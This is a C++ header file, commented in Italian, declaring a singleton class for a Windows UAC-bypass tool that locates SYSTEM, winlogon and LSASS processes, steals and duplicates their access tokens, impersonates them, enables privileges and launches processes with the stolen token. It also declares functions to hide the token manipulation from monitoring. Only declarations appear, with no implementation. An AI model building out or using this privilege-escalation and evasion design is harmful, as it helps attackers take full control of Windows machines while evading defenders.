#ifndef UAC_BYPASS_TOKEN_STEALING_H
#define UAC_BYPASS_TOKEN_STEALING_H

#include <windows.h>
#include <string>
#include <vector>
#include "Logger.h"
#include "Config.h"

namespace uac_bypass {

// Struttura per i dettagli del token
struct TokenDetails {
    DWORD processId;
    HANDLE tokenHandle;
    DWORD sessionId;
    std::wstring userName;
    std::wstring domainName;
    DWORD tokenType;
    DWORD elevationType;
    bool isElevated;
    std::vector<LUID> privileges;
};

// Struttura per i privilegi del token
struct TokenPrivilege {
    LUID privilegeLuid;
    std::wstring privilegeName;
    bool isEnabled;
    bool isElevated;
};

class TokenStealing {
public:
    static TokenStealing& getInstance();
    
    // Metodi principali
    bool initialize();
    bool stealSystemToken();
    bool elevateWithToken();
    bool cleanup();
    
    // Gestione token
    bool findTargetToken();
    bool duplicateToken(HANDLE sourceToken);
    bool impersonateToken(HANDLE token);
    bool revertToSelf();
    
    // Manipolazione privilegi
    bool enablePrivilege(const std::wstring& privilege);
    bool adjustTokenPrivileges(HANDLE token);
    bool verifyTokenPrivileges();
    
    // Ricerca processi
    bool findSystemProcess();
    bool findWinlogonProcess();
    bool findLSASSProcess();

private:
    TokenStealing();  // Singleton
    ~TokenStealing();
    
    TokenStealing(const TokenStealing&) = delete;
    TokenStealing& operator=(const TokenStealing&) = delete;

    // Metodi di ricerca
    bool findProcessByName(const std::wstring& processName);
    bool findProcessByPID(DWORD processId);
    bool findTokenByType(DWORD tokenType);
    
    // Manipolazione token
    bool openProcessToken(HANDLE process, DWORD access);
    bool duplicateTokenEx(HANDLE sourceToken);
    bool createProcessWithToken(HANDLE token);
    
    // Verifica token
    bool isTokenValid(HANDLE token);
    bool isTokenElevated(HANDLE token);
    bool hasRequiredPrivileges(HANDLE token);
    
    // Utility
    bool getTokenInformation(HANDLE token, TokenDetails& details);
    bool getTokenPrivileges(HANDLE token, std::vector<TokenPrivilege>& privileges);
    bool adjustTokenIntegrity(HANDLE token, DWORD integrityLevel);
    
    // Protezioni
    bool hideTokenManipulation();
    bool protectStolenToken();
    bool monitorTokenUsage();
    
    // Membri
    Logger& logger;
    bool initialized;
    HANDLE stolenToken;
    TokenDetails currentToken;
    std::vector<TokenPrivilege> currentPrivileges;
    
    // Costanti
    static const DWORD REQUIRED_ACCESS = TOKEN_ALL_ACCESS;
    static const DWORD MAX_PROCESSES = 1024;
    static const DWORD TOKEN_SEARCH_TIMEOUT = 5000;  // 5 secondi
};

// Macro per token stealing
#define STEAL_SYSTEM_TOKEN() \
    TokenStealing::getInstance().stealSystemToken()

// Macro per elevazione token
#define ELEVATE_WITH_TOKEN() \
    TokenStealing::getInstance().elevateWithToken()

} // namespace uac_bypass

#endif // UAC_BYPASS_TOKEN_STEALING_H